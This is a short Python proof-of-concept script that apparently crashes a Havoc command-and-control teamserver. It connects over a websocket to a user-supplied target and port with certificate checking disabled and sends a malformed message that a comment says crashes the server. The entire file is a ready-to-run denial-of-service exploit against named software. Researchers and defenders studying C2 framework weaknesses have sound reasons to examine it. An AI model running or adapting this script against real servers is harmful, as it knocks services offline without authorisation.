import argparse
import ssl
import websocket

def on_message(ws: websocket.WebSocket, message: str) -> None:
    print(f"Received: {message}")

def on_error(ws: websocket.WebSocket, error) -> None:
    print(f"Error: {str(error)}")

def on_close(ws: websocket.WebSocket, code: str, reason: str):
    print(f"Connection closed: {code} {reason}")

def on_open(ws: websocket.WebSocket):
    print("Connection opened")
    #Here we are sending the malformed input which crashes the server, ideally this is where the server would handle the incoming the username, password, event but ours is not that :) 
    ws.send(b"Hello Server!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", type=str, help="Havoc's IP Address or hostname", required=True)
    parser.add_argument("-p", "--port", type=int, help="Havoc's teamserver port (default port 40056)", required=True)
    args = parser.parse_args()

    websocket.enableTrace(True)
    ws = websocket.WebSocketApp(f"wss://{args.target}:{args.port}/havoc/",
                              on_open= on_open,
                              on_message = on_message,
                              on_error = on_error,
                              on_close = on_close)
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})  # Don't check for SSL certificate
